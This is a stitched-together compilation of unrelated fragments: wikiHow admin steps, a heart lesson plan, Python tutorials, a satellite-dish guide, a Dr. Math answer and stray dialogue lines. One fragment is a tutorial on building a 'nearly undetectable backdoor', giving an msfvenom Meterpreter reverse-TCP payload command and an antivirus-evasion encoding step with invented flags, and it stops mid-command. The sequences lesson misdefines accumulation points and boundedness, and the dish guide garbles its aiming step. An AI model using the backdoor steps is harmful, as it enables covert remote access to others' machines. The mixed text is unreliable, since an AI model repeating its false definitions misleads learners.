include: * Pay attention to the quality of the titles. Make sure they are clear, concise, and grammatically correct. * Check if the titles already exist as articles on wikiHow. Duplicate titles are not needed. * Be cautious when considering deletion of titles related to controversial topics, as these may require further discussion before being removed. **Step 4: Select the title(s) you want to delete.** After identifying the titles you wish to delete, select them by checking the box next to each title. Keep in mind that deleting a title permanently removes it from the database, so be sure about your decision before proceeding. **Step 5: Choose the "delete" option.** With the title(s) selected, click on the "delete" button at the top or bottom of the page. A confirmation message will appear asking if you're sure you want to delete the selected titles. Click "yes" to confirm. **Step 6: Verify the deletion.** After clicking "yes," wait a few moments while the system processes the request. Once complete, a success message should appear, indicating that the titles have been successfully deleted. You can verify the deletion by refreshing the Special:SuggestTitle page. The deleted titles should no longer appear in the list. **Key Guidelines:** * Only delete titles that meet the criteria mentioned above (duplicates, spam, etc.). * Always double-check your selection before finalizing the deletion. * Remember that deleting a title cannot be undone, so exercise caution. * Consider discussing controversial or debatable title deletions with other community members first. Part of Lesson Plan: Flow of Blood Through the Heart Activity Overview / Details Place students in groups of 3-5 students depending on class size. Once the students are in groups have each group select a recorder. Once the recorder is selected, have the recorders each come up and get an envelope for their group. Inside the envelope will be 3 different colors of paper with strips of the same color inside each piece of colored paper. Specify which color paper they are to begin with and what order to proceed in so that they are progressing from chambers only, including the lungs, chambers plus blood vessels, to chambers blood vessels, and valves all at one time. For example, pink paper, with pink strips inside, has chambers. Each group member will take turns putting the chambers in order. They will then open the yellow paper with yellow strips inside. Yellow has all of the blood vessels. So each group member will then put all of the chambers in order adding in where the blood vessels should go in the sequence. They will then open the green paper with green strips inside. Green equals heart valves. Each member will then place of the strips in order adding in blood vessels. Go through the steps of how they are to practice following the above instructions. The role of the recorder will be to keep the piece of paper and check that each group member places the strips in the correct order. Allow the groups to begin practicing putting the strips on the correct order. Walk around the room ensuring that all groups understand the process and all are involved. Allow 15-20 minutes of practice time. When 20 minutes have passed, give instructions for the recorders to place all of the strips inside the correct color paper and place all three papers inside the envelopes then return the envelopes to you. Everett maintained that the wavefunction does not collapse, and since all matter and interactions are presumed to be built up from quantum waveparticles, all possible variations of the quantum field-indicated by the mathematical equations-are "real" and simultaneously occurring but different courses of history. By this interpretation, whatever interacts with the field joins the field's state that is "relative" to the observer's state-itself a waveform in its own quantum field-while the two simply interact in a universal waveform never collapsing. By now, many physicists' interpretation of the apparent transition from the quantum to the classical realms is not wavefunction collapse, but quantum decoherence. Yes there's a cow up there. Creating a nearly undetectable backdoor using MSFvenom in Kali Linux is an advanced topic that requires a solid understanding of penetration testing concepts and tools. This tutorial will guide you through the process while explaining each step in detail. Please note that creating backdoors can be illegal if used maliciously; this tutorial is intended only for educational purposes and should never be used for unethical activities. **Step 1: Understanding Backdoors** A backdoor refers to a type of malware designed to provide remote access or control over a compromised system. It's often hidden within legitimate software or disguised as harmless files to evade detection. For this tutorial, we will create a reverse shell payload with Meterpreter using MSFvenom. **Step 2: Setting Up Your Environment** First, ensure your Kali Linux environment is up-to-date by running `apt update && apt upgrade`. Next, install Metasploit Framework (MSF) via `apt install metasploit-framework`. Once installed, start Metasploit with `msfconsole`. **Step 3: Generating the Payload** We'll generate a Python script containing our reverse shell code using MSFvenom. The command structure is: ```bash msfvenom -p <payload> LHOST=<your IP> LPORT=<port number> -f <output format> -o <output file> ``` Replace `<payload>` with `windows/meterpreter/reverse_tcp`, which creates a Windows Meterpreter reverse TCP connection. Replace `<your IP>` with your machine's public IP address and `<port number>` with any unused port above 4000 (e.g., 5555). Use `python` as output format and specify an output filename like so: ```bash msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=5555 -f python -o backdoor.py ``` This generates a Python script called 'backdoor.py' that executes when run on a target Windows machine. **Key Tips:** * Always choose an unused high-numbered port to minimize interference with regular network services. * Never expose sensitive information such as your localhost IP or internal network details during generation. **Step 4: Encoding the Payload** To avoid antivirus detection, encode the generated payload. We'll use Shikata Ga Nai encoding method since it's widely supported and effective against many AV solutions. Modify the previous command by adding `--encxcfb --encpost` parameters before `-f` parameter: ```bash msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=555 Um okay you don't have play food at home, but you do have his cabbage patch doll. And I thank you for the hands that made it. Title: Understanding Sequences and Accumulation Points Hi Grade Schoolers! Today we are going to learn about sequences and their special points called "accumulation points". Don't worry, this isn't as complicated as it sounds! Imagine you have a bunch of your favorite candies lined up in a row. Each candy has a number on it, starting from 1. This line of candies with numbers is what we call a "sequence." Now let's talk about accumulation points using these candies as our example. Accumulation Point Example: Suppose you have two types of candies - red and blue. You start by lining up all the red candies first (let's say there are 5 red ones), followed by the blue candies (say there are 8 blue ones). So our sequence looks like this: Red1, Red2, Red3, Red4, Red5, Blue1, Blue2, ... , Blue8. In this case, where do you think the accumulation points would be? The answer is Red5 and Blue1 because those are the places where colors change! These changing spots act as "special meeting points," or "accumulation points" for short. They show us where quantities build up before switching over to something new. Converging Sequence Concept: Now, imagine throwing away some candies from each end of the line while keeping the rest of the arrangement intact. As you remove candies progressively from both ends, eventually, the last few remaining candies will hover around a particular spot after several throws. That final position most candies settle into is known as the limit of the sequence. When a sequence reaches its limit, we also say the sequence "converges." In other words, when a sequence becomes less sensitive to removing items from either side and settles down near a specific value, then it is said to converge towards that value. Bounded vs Unbounded Sequences: You know how sometimes parents set limits on how many candies you can eat per day? Well, similar rules apply here too! A sequence is considered "bounded" when there is a maximum amount of jumps between any two elements within that sequence. It's just like having mom or dad setting a reasonable upper limit on candies consumed daily. An unbounded sequence, however, doesn't have such restrictions - meaning you could theoretically jump to any location from wherever you currently are, even beyond Earth! Thankfully, math doesn't allow THAT kind of craziness! Wrapping Up: To sum things up, today we learned that understanding sequences involves knowing about convergence, accumulation points, bounds, and whether or not a sequence is sensitive to changes or stable under removals. We saw how these concepts work together through fun analogies involving everyone's favorite thing... CANDY!!! Remember, learning mathematics requires patience and practice, but once mastered, it opens doors to solving complex problems easily. Happy studying! that's what I was lookin' for. Title: Have an Enjoyable Day out With Your Mother Without Going Shopping and Make Her Enjoy Taking You Out Introduction: Spending quality time with your mother is essential, as it strengthens your bond and creates lasting memories. However, many activities often involve shopping, which may not be feasible or enjoyable for everyone. This wiki-style guide will help you plan a fulfilling day out with your mother without going shopping, ensuring both of you have fun and enjoy taking each other out. Step 1: Brainstorm Activities Together Discuss different non-shopping related activities that interest both of you. Sharing hobbies can lead to unique experiences, such as visiting art galleries, attending cooking classes, or exploring nature trails. By involving her in the planning process, she feels valued and excited about the upcoming day. Key Tip: Be open-minded and consider trying new things together; this fosters growth and understanding between you two. Step 2: Choose a Suitable Date and Time Schedule the outing at a convenient time for both parties, avoiding any potential conflicts. Consider factors like work schedules, appointments, and transportation availability when deciding on the date and time. Guideline: Aim for a weekday if possible, as weekend venues tend to be more crowded. Step 3: Plan Transportation Decide whether you'll drive, take public transit, walk, bike, or carpool with another family member. Ensuring smooth transportation reduces stress and allows both of you to focus on enjoying the day. Key Tip: Public transit options sometimes offer discounted fares for seniors; check local policies beforehand. Step 4: Prepare Necessary Items Pack essential items based on chosen activity, including water bottles, snacks, sunscreen, insect repellent, cameras, or notebooks for sketching. Having these items readily available enhances convenience and comfort during the outing. Step 5: Dress Appropriately Wear clothing suitable for the planned activity, considering weather conditions and dress codes. Comfortable shoes are crucial for walking and standing throughout the day. Step 6: Start the Day Off Right Begin the day by expressing gratitude towards your mother for spending time with you. Small gestures like offering breakfast, holding doors open, or carrying heavy bags demonstrate respect and appreciation. Step 7: Engage Fully During Activities Actively participate in all activities, showing enthusiasm and curiosity. Encourage conversation and share thoughts openly, promoting deeper connections and understanding. Key Tips: Avoid checking phones or engaging in distractions unrelated to the activity; maintain eye contact and ask questions to show genuine interest. Step 8: Document Memories Take photographs, write down highlights, or create sketches throughout the day. These mementos serve as reminders of shared experiences and provide material for future discussions. Step 9: Share Responsibilities Alternate tasks and responsibilities, such as navigating routes, purchasing tickets, or carrying equipment. This collaborative approach promotes teamwork and equality. Step 10: Reflect on the Experience At the end of the day, discuss what went well, areas for improvement, and potential ideas for future outings. Showing reflection demonstrates maturity and thoughtfulness while providing valuable insights for next time. Conclusion: By following these steps, you ensure a memorable and delightful experience for both yourself and your mother. Focusing on shared interests and values encourages stronger bonds and mutual satisfaction, transforming everyday errands into cherished adventures. "Not so fast there, Princess; hold Thun back a bit. Code Help and Videos > In Python code, a string is written withing double quotes, e.g. "Hello", or alternately within single quotes like 'Hi'. Use the len(s) function to get the length of a string, and use square brackets to access individual chars inside the string. The chars are numbered starting with 0, and running up to length-1. s = 'Hello' len(s) ## 5 ## Chars are numbered starting with 0 s ## 'H' s ## 'e' s ## 'o' -- last char is at length-1 s ## ERROR, index out of bounds Python strings are "immutable" which means a string can never be changed once created. Use + between two strings to put them together to make a larger string s = 'Hello' t = 'Hello' + ' hi!' ## t is 'Hello hi!' A "slice" in Python is powerful way of referring to sub-parts of a string. The syntax is s[i:j] meaning the substring starting at index i, running up to but not including index j. s = 'Hello' # 01234 ## Showing the index numbers for the 'Hello' s[1:4] ## 'ell' -- starting at 1, up to but not including 4 s[0:2] ## 'He' If the first slice number is omitted, it just uses the start of the string, and likewise if the second slice number is omitted, the slice runs through the end of the string. s = 'Hello' # 01234 s[:2] ## 'He', omit first number uses start of string s[2:] ## 'llo', omit second number uses end of string Use the slice syntax to refer to parts of a string and + to put parts together to make bigger strings. a = 'Hi!' b = 'Hello' # Compute c as the first 2 chars of a followed by the last 2 chars of b c = a[:2] + b[len(b) - 2:] A bad index in Python, e.g. s for the string "Hello", is a runtime error. However, slices work differently. If an index number in a slice is out of bounds, it is ignored and the slice uses the start or end of the string. Negative Index As an alternative, Python supports using negative numbers to index into a string: -1 means the last char, -2 is the next to last, and so on. In other words -1 is the same as the index len(s)-1, -2 is the same as len(s)-2. The regular index numbers make it convenient to refer to the chars at the start of the string, using 0, 1, etc. The negative numbers work analogously for the chars at the end of the string with -1, -2, etc. working from the right side. s = 'Hello' # -54321 ## negative index numbers s[-2:] ## 'lo', begin slice with 2nd from the end s[:-3] ## 'He', end slice 3rd from the end One way to loop over a string is to use the range(n) function which given a number, e.g. 5, returns the sequence 0, 1, 2, 3 ... n-1. Those values work perfectly to index into a string, so the loop for i in range(len(s)): will loop the variable i through the index values 0, 1, 2, ... len(s)-1, essentially looking at each char once. s = 'Hello' result = '' for i in range(len(s)): # Do something with s[i], here just append each char onto the result var result = result + s[i] Since we have the index number, i, each time through the loop, it's easy to write logic that involes chars near to i, e.g. the char to the left is at i-1. Another way to refer to every char in a string is with the regular for-loop: s = 'Hello' result = '' for ch in s: ## looping in this way, ch will be 'H', then 'e', ... through the string result = result + ch This form is an easy way to look at each char in the string, although it lacks some of the flexibility of the i/range() form above. This guide will walk you through the process of assembling one using readily available materials. Materials Needed: 1. Empty clear plastic water jug (at least 1-gallon capacity) 2. LED string lights or battery operated fairy lights (should have a timer function if possible) 3. Clear packing tape or duct tape 4. Scissors The name "Europa" was later used to describe Greece. France was under naval blockade imposed by Great Britain and could not import the pure graphite sticks from the British Grey Knotts mines - the only known source in the world for solid graphite. France was also unable to import the inferior German graphite pencil substitute. It took the efforts of an officer in Napoleon's army to change this. In 1795, Nicholas Jacques Cont discovered a method of mixing powdered graphite with clay and forming the mixture into rods that were then fired in a kiln. By varying the ratio of graphite to clay, the hardness of the graphite rod could also be varied. This method of manufacture, which had been earlier discovered by the Austrian Joseph Hardtmuth of Koh-I-Noor in 1790, remains in use. She had polio that left her disabled when she was 6 years old and some people think that she may have had spina bifida (a birth defect affecting the development of part of the spine) as well. She studied medicine and was going to become a doctor. Because of a traffic accident at age 18 which badly injured her, she had periods of severe pain for the rest of her life. After this accident, Kahlo no longer continued her medical studies but took up painting. She used ideas about things that had happened to her. Her paintings are often shocking in the way they show pain and the harsh lives of women, especially her feelings about not being able to have children. Fifty-five of her 143 paintings are of herself. She was also influenced by native Mexican culture, shown in bright colors, with a mixture of realism and symbolism. Her paintings attracted the attention of the artist Diego Rivera, whom she later married. She was openly bisexual and was a communist. A day is the time it takes the Earth to spin around once. It is day time on the side of the Earth that is facing the Sun. When it is night time, that side of the Earth is facing away from the Sun. It takes 24 hours for the Earth to spin once, so that is one day, including the day time and night time. This is mean solar time, measured relative to the Sun. There is also sidereal time, measured relative to the fixed stars. The sidereal day is a few minutes shorter. Once upon a time, there was an otter who was in a hurry. The otter wanted to get somewhere quickly, and so he began to run. As he ran, he soon passed a pond. By the pond stood a duck who noticed the otter running. "Why are you in such a hurry?" asked the duck. The otter stopped to catch his breath, and then he replied, "I need to get somewhere quickly. Can you help me?" The duck smiled and said, "Of course. Before I can help, I need you to be very quiet. Can you do that?" The otter nodded, and stayed nice and quiet. The duck then waved his wings, and the pond filled up with water. The otter hopped in and it quickly carried him to where he wanted to go. The otter hopped out of the pond, safe and sound. Thank you!" he said to the duck. "You really helped me!" The duck smiled and replied, "You're welcome. Remember to be quiet and hurry when you need to!" Do you think maybe we could turn the TV down? A formal introduction to python Now it's time to write our first python program, a typical hello world! program. You have two choices to write your python program: 1. Using interpreter & 2. Using source file. Here is how to write hello world! program in python- #First python program print "Hello World!" The code starts with # sign indicates that it is a comment line. The output of the program is- Input from user In python, raw_input is used to take input from user end. Look at the bellow example- print "Hi ! What's your name?" name=raw_input("My name is :") print "Nice to meet you %s"%s Indentation is important in python. The statements which go together must have same indentation. Each such set of statements is called a block. Take a look at the following example- #Same indentation & will run successfully i=6 print " The value of i is",i #This will show an error message as indentation level is not same i=6 print "The value of i is",i Control Flow Statement In python, three control flow statements are used: if, for & while. The if statement The if statement is used to check a condition and if the condition is true, a block of statements are executed (called the if-block), else another block of statements (called the else-block) are executed. The else clause is optional. Here is am example of if statement- number=14 guess=int(raw_input("Enter an integer:")) if guess==number: print "Yes! You have guessed the right number." elif guess<number: print "Your guess is little lower than the number!" else: print "Your guess is little higher than the number!" The for loop When we need to do a work repeatedly for a number of times, we can use for loop. Bellow is an example of for loop- for i in range(1,10): print i The output of the above code will be- The while statement The while statement allows you to repeatedly execute a block of statements as long as a condition is true. It is also another looping statement. A while statement can have an optional else clause. Take a look at the example given below- stop=False password="atik" while not stop: guess=raw_input("Enter password:") if guess==password: print "Hello atik! Nice to see you" stop=True else: print "Hello guest! Try once again" The break Statement The break statement is used to break out of a loop statement even if the loop condition has not become False. Here is an example- stop=False while not stop: something=raw_input("Enter something:") if something=="quit": break Comments in Python Comment s are used as the documentation of your work. They explains your code, which is helpful when someone else want to work with your code. Or they can be useful to you also at a later date to understand easily what you have done. Comments are not executed, so they have no effect when a program runs. In Python use can comment using # sign. Anything right to # sign will be treated as comment. So take a look at the example below how to make a comment- Example:Comments in python #This will print Hello World print "Hello World!" Constants are used to store some piece of data. But their values are fixed , which means their values are never changed. A constant can be either numeric constant or string constant. Numeric constants are just numbers like 4, 2.6 etc. String constant is a sequence of characters like "This is a string constant" or "Hello World!" and so on. Variables are used to store some information and manipulate it. It's value can vary. Variables are just parts of your computers memory where you can store some information. To access a variable you need to give them name. There are some rules for naming variable- 1.First character must be a letter or underscore(_). 2.Other characters should be letter, digit or underscore. 3.Variable names are case-sensitive. For example- myname is not same as myName. Example:Use of Variables i=5 print i i=i+1 print i Basic Data Types Now we will discuss about the basic data types in Python. The basic data types used in Python are- b)Long Integer Number c)Floating Point Number Integer numbers are just whole numbers. Example of integers are- 3,6,-11 etc. Long Integer Number Long integers are nothing than bigger numbers. Floating Point Number Floating point numbers are numbers with decimal points. For example- 4.25,5.3E-2 etc. Examples of complex numbers are (2+3j),(-4+6j) etc. A string is just simply sequence of characters. You can use string in Python as following ways- 1.Using single quotes->'This is a string' 2.Using double quotes->"This is a string enclosed in double quotes" 3.Using triple quotes->'''This is a string enclosed in triple quotes''' Note:Triple quotes are generally used in multi-line strings. For example- '''This is a multi-line string. This is the second line. Here comes the last line.''' In order to use you native language in python, you need to use unicode enabled editor. You can use unicode string in this way- u'This is a unicode string' If you need to use a special character in your string and you don't want any special processing, then you need to use raw string. Here is how can you do it- r"New lines are represented by\n" Let you want to use a string which itself contains a single quotation mark such as What's your name? You cann't use 'What's your name?'. In that case you need to do a special process called escape sequence. It is done by- 'What\'s your name?'. You can also use double quotation mark- "What's your name?". In case of string containing double quote you need to do the same thing. Once there was a little girl named Rachel. She liked to go for walks and explore the world. Title: How to Align a Satellite Dish Antenna **Introduction:** Satellite dish antennas are used to receive television signals from satellites orbiting the Earth. To get the best reception, you need to align your satellite dish correctly. This process involves adjusting both the azimuth (left-right) and elevation (up-down) angles of the dish. Here's a comprehensive guide on how to do this: **Step 1: Gather Your Tools** You will need a compass or GPS device to find true north, a spirit level to ensure the dish is mounted horizontally, a friend to help with positioning, and optionally, a satellite signal meter for fine tuning. **Step 2: Find Satellite Information** Find out which satellite provides your TV service. You should be able to find this information in your subscription details or by contacting your service provider. Note down its longitude and latitude coordinates. **Step 3: Position the Dish** Mount your dish according to manufacturer instructions. Use your compass or GPS device to point the front of the dish towards the satellite's longitude coordinate, i.e., True North if you're in the Northern Hemisphere, and True South in the Southern Hemisphere. **Key Tip**: Make sure there are no obstructions like trees or buildings blocking the path between the dish and the satellite. **Step 4: Level the Dish** Use your spirit level to make sure the base of the dish is perfectly horizontal. This affects the elevation angle setting. **Step 5: Set Initial Elevation Angle** The initial elevation angle can be calculated using online tools providing 'satellite dish calculators'. Enter your location and select the appropriate satellite. The result given is your starting point. Adjust the dish's vertical tilt accordingly. **Step 6: Coarse Azimuth Adjustment** With the assistance of your helper, move the entire dish left or right until you pick up a strong signal. A signal meter makes this easier but isn't necessary. Some dishes have built-in indicators that change when they detect a signal. **Step 7: Fine Tune the Signal** Now switch on your receiver and tune into a channel known to provide clear live view during alignment. If you don't have one, any non-encrypted test channel would work. With a signal meter, tweak the azimuth slowly until you see the maximum signal strength. Without a meter, observe the picture quality; it should become clearer as you near perfect alignment. **Step 8: Finalize Elevation** Once satisfied with the azimuth adjustment, recheck the elevation angle. It may require slight modification due to minor errors made earlier. After finalizing the elevation, double-check both readings before securing the dish mount. **Step 9: Check Reception** Perform a full scan of all available channels to confirm good reception across all frequencies. Rescan after heavy storms or high winds since these could shift your dish slightly out of alignment. **Guidelines:** - Always prioritize safety. Don't risk injury by attempting dangerous maneuvers. - Be patient. Finding exact positions might take some time. - Regularly maintain your dish to prevent damage from weather conditions. Remember, every setup is unique due to differences in geographical locations, equipment types, etc. Therefore, what works perfectly for someone else might not yield the same results for you. However, following this guide diligently will significantly improve your chances of successful alignment. You'll put on the records after you get through with your microphone. Date: 01/22/2001 at 22:49:31 From: Elaien Chesebro Subject: Working Backward This problem was given to my son in 7th grade. He was told to use a working backward strategy to solve it. I cannot figure it out using that method. Can you explain it that way?? Thanks. Ann, Barry, Chip, Doug, Evelyn and Fred went to lunch to celebrate Evelyn's and Fred's birthdays. Each person's meal cost the same amount. Evelyn and Fred were being treated for their meals, but each was to chip in equally for the his or her share of the other's meal. If the bill came to $54.00, HOW MUCH SHOULD EACH PERSON PAY? (Evelyn is being treated, but she is still paying a share of Fred's meal, and the same goes for Fred.) Thanks for any help you can offer. Date: 01/23/2001 at 08:52:08 From: Doctor Rick Subject: Re: Working Backward Hi, Elaine. Let's see if we can re-state the situation in a way that makes it clearer what is happening. There are 6 people. Evelyn pays nothing for her meal, but the other five share the cost of her meal. That is, each of those five (including Fred) pays for 1/5 of Evelyn's meal. Likewise, Fred does not pay for his meal, but each of the other five (including Evelyn) pays for 1/5 of his meal. The four who are not being treated each pay for their own meal, plus 1/5 of each of Ev's and Fred's meals. We can now make a table showing how many meals each person pays for: Ann 1 2/5 Barry 1 2/5 Chip 1 2/5 Doug 1 2/5 Evelyn 1/5 Fred 1/5 Add up these fractions, and what do we get? Exactly 6. That's no surprise: 6 meals were eaten, and they must all be paid for somehow. This is a check that we've understood the math correctly so far. If we only knew how much one meal cost, we could figure out how much each person paid, couldn't we? We just multiply the cost of a meal by the number of meals. Ann, for instance, paid 1 2/5 times the cost of one meal. Here, at last, is where "working backward" comes in. We know the total cost was $54. We know that there were 6 meals. How much did each meal cost? If we knew the cost per meal, we would multiply it by 6 to get the total cost. Working backward, starting from the total cost, we must DIVIDE by 6 to get the cost per meal: [Cost per meal] * 6 = $54 $54 / 6 = [Cost per meal] We've already figured out how to get from this figure to the amount that each person paid. You can finish the work. - Doctor Rick, The Math Forum http://mathforum.org/dr.math/ Search the Dr. Math Library: Ask Dr. MathTM 1994-2013 The Math Forum Thought you wanted to go ride your bike? There are more than 7,500 known cultivars (varieties) of apples. Different cultivars are available for temperate and subtropical climates.
